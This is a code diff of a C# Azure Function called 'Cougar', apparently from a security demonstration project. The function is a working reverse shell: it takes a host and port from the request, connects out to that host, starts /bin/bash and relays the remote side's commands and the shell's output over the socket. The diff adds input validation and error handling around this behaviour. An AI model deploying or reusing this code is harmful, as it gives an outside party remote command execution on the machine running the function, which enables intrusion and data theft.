@@ -1,3 +1,8 @@
+/*
+References:
+https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc
+*/
+
 using System;
 using System.Text;
 using System.IO;
@@ -5,6 +10,7 @@ using System.Diagnostics;
 using System.ComponentModel;
 using System.Linq;
 using System.Net;
+using System.Net.Http;
 using System.Net.Sockets;
 using System.Threading.Tasks;
 using Microsoft.AspNetCore.Mvc;
@@ -14,6 +20,27 @@ using Microsoft.AspNetCore.Http;
 using Microsoft.Extensions.Logging;
 using Newtonsoft.Json;
 
+class Response
+{
+    public string message { get; set; }
+}
+
+class Responses
+{
+    public static HttpResponseMessage error(string message, HttpStatusCode statusCode)
+    {
+        Response data = new Response();
+        data.message = message;
+
+        string json = JsonConvert.SerializeObject(data);
+
+        return new HttpResponseMessage(statusCode)
+        {
+            Content = new StringContent(json, Encoding.UTF8, "application/json")
+        };
+    }
+}
+
 namespace Puma.Security.Functions.Azure
 {
     public static class Cougar
@@ -22,53 +49,79 @@ namespace Puma.Security.Functions.Azure
         static ILogger logger;
         
         [FunctionName("Cougar")]
-        public static async Task<IActionResult> Run(
-            [HttpTrigger(AuthorizationLevel.Function, "get", "post", Route = null)] HttpRequest req,
+        public static async Task<HttpResponseMessage> Run(
+            [HttpTrigger(AuthorizationLevel.Function, "get", Route = null)] HttpRequest req,
             ILogger log)
         {
             logger = log;
 
             logger.LogInformation("Processing Cougar request.");
 
-            string ip = req.Query["ip"];
+            string host = req.Query["host"];
             string port = req.Query["port"];
 
-            string requestBody = await new StreamReader(req.Body).ReadToEndAsync();
-            dynamic data = JsonConvert.DeserializeObject(requestBody);
-            ip = ip ?? data?.ip;
-            port = port ?? data?.port;
+            if (string.IsNullOrEmpty(host) || string.IsNullOrEmpty(port))
+            {
+                return Responses.error("Must provide the host and port for the target TCP server as query parameters.", HttpStatusCode.BadRequest);
+            }
 
-            using(TcpClient client = new TcpClient(ip, int.Parse(port)))
-			{
-				using(Stream stream = client.GetStream())
-				{
-					using(StreamReader rdr = new StreamReader(stream))
-					{
-						streamWriter = new StreamWriter(stream);
-						
-						StringBuilder strInput = new StringBuilder();
+            int portNum;
 
-						Process p = new Process();
-						p.StartInfo.FileName = "/bin/bash";
-						p.StartInfo.CreateNoWindow = true;
-						p.StartInfo.UseShellExecute = false;
-						p.StartInfo.RedirectStandardOutput = true;
-						p.StartInfo.RedirectStandardInput = true;
-						p.StartInfo.RedirectStandardError = true;
-						p.OutputDataReceived += new DataReceivedEventHandler(cmdOutputDataHandler);
-						p.Start();
-						p.BeginOutputReadLine();
+            try
+            {
+                portNum = int.Parse(port);
+            }
+            catch (Exception err)
+            {
+                return Responses.error(err.ToString(), HttpStatusCode.BadRequest);
+            }
 
-						while(true)
-						{
-							strInput.Append(rdr.ReadLine());
-							//strInput.Append("\n");
-							p.StandardInput.WriteLine(strInput.ToString());
-							strInput.Remove(0, strInput.Length);
-						}
-					}
-				}
-			}
+            try
+            {
+                using (TcpClient client = new TcpClient(host, portNum))
+                {
+                    using (Stream stream = client.GetStream())
+                    {
+                        using (StreamReader rdr = new StreamReader(stream))
+                        {
+                            streamWriter = new StreamWriter(stream);
+
+                            StringBuilder strInput = new StringBuilder();
+
+                            Process p = new Process();
+                            p.StartInfo.FileName = "/bin/bash";
+                            p.StartInfo.CreateNoWindow = true;
+                            p.StartInfo.UseShellExecute = false;
+                            p.StartInfo.RedirectStandardOutput = true;
+                            p.StartInfo.RedirectStandardInput = true;
+                            p.StartInfo.RedirectStandardError = true;
+                            p.OutputDataReceived += new DataReceivedEventHandler(cmdOutputDataHandler);
+                            p.Start();
+                            p.BeginOutputReadLine();
+
+                            while (true)
+                            {
+                                string line = rdr.ReadLine();
+
+                                if (line == null)
+                                {
+                                    break;
+                                }
+
+                                strInput.Append(line);
+                                p.StandardInput.WriteLine(strInput.ToString());
+                                strInput.Remove(0, strInput.Length);
+                            }
+
+                            return Responses.error("Connection terminated from client.", HttpStatusCode.InternalServerError);
+                        }
+                    }
+                }
+            }
+            catch (Exception err)
+            {
+                return Responses.error(err.ToString(), HttpStatusCode.InternalServerError);
+            }
         }
 
         private static void cmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
@@ -83,7 +136,10 @@ namespace Puma.Security.Functions.Azure
                     streamWriter.WriteLine(strOutput.ToString());
                     streamWriter.Flush();
                 }
-                catch (Exception err) { logger.LogInformation($"Error writing output: {err}"); }
+                catch (Exception err)
+                {
+                    logger.LogInformation($"Error writing output: {err}");
+                }
             }
         }
     }
